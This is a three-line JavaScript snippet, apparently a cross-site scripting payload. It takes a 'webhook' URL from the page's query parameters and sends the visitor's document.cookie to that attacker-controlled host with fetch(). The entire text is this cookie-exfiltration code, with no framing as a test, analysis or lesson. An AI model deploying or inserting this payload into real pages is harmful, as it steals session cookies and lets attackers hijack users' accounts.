const urlParams = new URLSearchParams(window.location.search);
const webhook = urlParams.get('webhook');
fetch(webhook+document.cookie);
